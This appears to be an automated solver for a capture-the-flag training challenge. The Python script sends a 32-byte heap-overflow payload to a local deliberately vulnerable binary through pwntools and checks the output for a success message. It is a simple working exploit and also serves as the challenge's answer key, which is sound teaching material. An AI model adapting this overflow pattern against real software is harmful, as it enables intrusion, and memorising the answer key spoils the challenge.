#!/usr/bin/env python3
"""
Level 1: Automated Solver

This script automatically solves the Level 1 challenge.
It can be used to verify the solution or as a reference.
"""

import sys
import os

def solve():
    """Automatically solve Level 1"""

    print("="*60)
    print("   Level 1: Heap Overflow - Automated Solver")
    print("="*60)
    print()

    # Check binary
    if not os.path.exists("./challenge/vuln"):
        print("[!] Error: vuln binary not found")
        print("[!] Run from level01_overflow directory")
        return False

    # Check flag file
    if not os.path.exists("./challenge/flag.txt"):
        print("[*] Creating flag.txt...")
        with open("./challenge/flag.txt", "w") as f:
            f.write("flag{heap_overflow_master_level1}\n")
        print("[+] Flag file created")
        print()

    # Build payload
    payload = b"A" * 32 + b"pwned!\n"

    print(f"[*] Payload: {payload}")
    print(f"[*] Payload length: {len(payload)} bytes")
    print()

    # Launch process and send payload
    print("[*] Launching vulnerable program...")

    from pwn import *

    try:
        p = process("./challenge/vuln")
        p.sendline(payload)

        # Receive output
        output = p.recvall(timeout=2).decode()

        print(output)

        # Check for success
        if "Congratulations" in output:
            print("[+] Exploit successful!")
            print("[+] Flag captured!")
            return True
        else:
            print("[-] Exploit failed")
            return False

    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def main():
    success = solve()
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())
